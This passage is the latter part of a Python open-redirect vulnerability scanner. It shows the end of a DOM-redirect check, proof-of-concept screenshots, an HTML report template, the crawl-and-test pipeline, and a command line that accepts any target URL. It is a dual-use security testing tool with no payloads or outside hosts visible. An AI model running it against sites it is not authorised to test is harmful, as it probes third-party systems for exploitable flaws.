                        parameter=param.name,
                        payload=payload,
                        method=param.method,
                        response_code=200,
                        redirect_url=match,
                        context=param.context,
                        timestamp=datetime.now().isoformat(),
                        vulnerability_type="dom_based_redirect"
                    )
        
        return None
    
    async def take_screenshot(self, url: str) -> Optional[str]:
        """Take screenshot of the redirect for PoC"""
        if not self.driver:
            return None
        
        try:
            # Generate unique filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
            filename = f"poc_{timestamp}_{url_hash}.png"
            screenshot_path = f"/workspace/screenshots/{filename}"
            
            # Create screenshots directory
            Path("/workspace/screenshots").mkdir(exist_ok=True)
            
            # Navigate and take screenshot
            self.driver.get(url)
            await asyncio.sleep(2)  # Wait for page load
            
            self.driver.save_screenshot(screenshot_path)
            self.logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
            
        except Exception as e:
            self.logger.error(f"Error taking screenshot for {url}: {e}")
            return None
    
    def save_parameters(self, filename: str = "extracted_parameters.json"):
        """Save all extracted parameters to file"""
        params_data = [asdict(param) for param in self.parameters]
        
        with open(f"/workspace/{filename}", 'w', encoding='utf-8') as f:
            json.dump(params_data, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"Parameters saved to {filename}")
    
    def generate_report(self, output_file: str = "open_redirect_report.html"):
        """Generate comprehensive HTML report"""
        template_str = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Open Redirect Vulnerability Report</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
                .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .header { text-align: center; color: #d32f2f; margin-bottom: 30px; }
                .summary { background: #e3f2fd; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
                .vulnerability { background: #ffebee; border-left: 4px solid #f44336; padding: 15px; margin-bottom: 15px; border-radius: 4px; }
                .parameter { background: #f3e5f5; border-left: 4px solid #9c27b0; padding: 10px; margin-bottom: 10px; border-radius: 4px; }
                .screenshot { max-width: 100%; border: 1px solid #ddd; border-radius: 4px; }
                .code { background: #f5f5f5; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; }
                .success { color: #4caf50; font-weight: bold; }
                .warning { color: #ff9800; font-weight: bold; }
                .error { color: #f44336; font-weight: bold; }
                .metadata { font-size: 0.9em; color: #666; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🔍 Open Redirect Vulnerability Report</h1>
                    <p>Professional Security Assessment</p>
                </div>
                
                <div class="summary">
                    <h2>📊 Executive Summary</h2>
                    <p><strong>Target:</strong> {{ target_url }}</p>
                    <p><strong>Scan Date:</strong> {{ scan_date }}</p>
                    <p><strong>URLs Crawled:</strong> {{ urls_crawled }}</p>
                    <p><strong>Parameters Discovered:</strong> {{ total_parameters }}</p>
                    <p><strong>Redirect Parameters:</strong> {{ redirect_parameters }}</p>
                    <p><strong>Vulnerabilities Found:</strong> <span class="{% if vulnerabilities_count > 0 %}error{% else %}success{% endif %}">{{ vulnerabilities_count }}</span></p>
                </div>
                
                {% if vulnerabilities %}
                <div class="vulnerabilities">
                    <h2>🚨 Discovered Vulnerabilities</h2>
                    {% for vuln in vulnerabilities %}
                    <div class="vulnerability">
                        <h3>{{ vuln.vulnerability_type|title }} Vulnerability #{{ loop.index }}</h3>
                        <p><strong>URL:</strong> <code>{{ vuln.url }}</code></p>
                        <p><strong>Parameter:</strong> <code>{{ vuln.parameter }}</code></p>
                        <p><strong>Payload:</strong> <code>{{ vuln.payload }}</code></p>
                        <p><strong>Method:</strong> {{ vuln.method }}</p>
                        <p><strong>Response Code:</strong> {{ vuln.response_code }}</p>
                        <p><strong>Redirect URL:</strong> <code>{{ vuln.redirect_url }}</code></p>
                        <p><strong>Context:</strong> {{ vuln.context }}</p>
                        <p><strong>Timestamp:</strong> {{ vuln.timestamp }}</p>
                        
                        {% if vuln.screenshot_path %}
                        <div class="screenshot-container">
                            <h4>📸 Proof of Concept Screenshot:</h4>
                            <img src="{{ vuln.screenshot_path }}" alt="PoC Screenshot" class="screenshot">
                        </div>
                        {% endif %}
                    </div>
                    {% endfor %}
                </div>
                {% endif %}
                
                <div class="parameters">
                    <h2>🔍 Discovered Parameters</h2>
                    <p>Total parameters found: {{ total_parameters }}</p>
                    
                    {% for param in redirect_params %}
                    <div class="parameter">
                        <h4>🎯 {{ param.name }} <span class="warning">(Redirect-Related)</span></h4>
                        <p><strong>Value:</strong> <code>{{ param.value }}</code></p>
                        <p><strong>Source:</strong> {{ param.source }}</p>
                        <p><strong>Context:</strong> {{ param.context }}</p>
                        <p><strong>URL:</strong> <code>{{ param.url }}</code></p>
                        <p><strong>Method:</strong> {{ param.method }}</p>
                    </div>
                    {% endfor %}
                </div>
                
                <div class="footer">
                    <p class="metadata">Report generated by Professional Open Redirect Scanner v1.0</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        template = Template(template_str)
        
        # Prepare data for template
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        
        report_data = {
            'target_url': self.target_url,
            'scan_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'urls_crawled': len(self.discovered_urls),
            'total_parameters': len(self.parameters),
            'redirect_parameters': len(redirect_params),
            'vulnerabilities_count': len(self.vulnerabilities),
            'vulnerabilities': [asdict(v) for v in self.vulnerabilities],
            'redirect_params': [asdict(p) for p in redirect_params]
        }
        
        # Generate report
        report_html = template.render(**report_data)
        
        with open(f"/workspace/{output_file}", 'w', encoding='utf-8') as f:
            f.write(report_html)
        
        self.logger.info(f"Report generated: {output_file}")
    
    async def run_scan(self):
        """Run the complete scanning process"""
        self.logger.info("🚀 Starting Professional Open Redirect Scanner")
        
        try:
            # Initialize session and driver
            await self.init_session()
            self.init_driver()
            
            # Phase 1: Deep crawling
            self.logger.info("Phase 1: Deep crawling and parameter extraction")
            await self.crawl_website()
            
            # Phase 2: Parameter analysis and filtering
            self.logger.info("Phase 2: Analyzing parameters for redirect patterns")
            redirect_params = [p for p in self.parameters if p.is_redirect_related]
            self.logger.info(f"Found {len(redirect_params)} redirect-related parameters")
            
            # Phase 3: Vulnerability testing
            self.logger.info("Phase 3: Testing for open redirect vulnerabilities")
            await self.test_open_redirect()
            
            # Phase 4: Save results
            self.logger.info("Phase 4: Saving results and generating report")
            self.save_parameters()
            self.generate_report()
            
            # Summary
            self.logger.info("🎯 Scan Summary:")
            self.logger.info(f"   URLs Crawled: {len(self.discovered_urls)}")
            self.logger.info(f"   Parameters Found: {len(self.parameters)}")
            self.logger.info(f"   Redirect Parameters: {len(redirect_params)}")
            self.logger.info(f"   Vulnerabilities Found: {len(self.vulnerabilities)}")
            
        except Exception as e:
            self.logger.error(f"Scan failed: {e}")
            raise
        finally:
            # Cleanup
            if self.session:
                await self.session.close()
            if self.driver:
                self.driver.quit()


async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Professional Open Redirect Vulnerability Scanner')
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('--depth', type=int, default=3, help='Maximum crawling depth (default: 3)')
    parser.add_argument('--max-pages', type=int, default=100, help='Maximum pages to crawl (default: 100)')
    parser.add_argument('--output', default='open_redirect_report.html', help='Output report filename')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.target.startswith(('http://', 'https://')):
        args.target = f"https://{args.target}"
    
    # Create scanner and run
    scanner = OpenRedirectScanner(args.target, args.depth, args.max_pages)
    await scanner.run_scan()


if __name__ == "__main__":
    asyncio.run(main())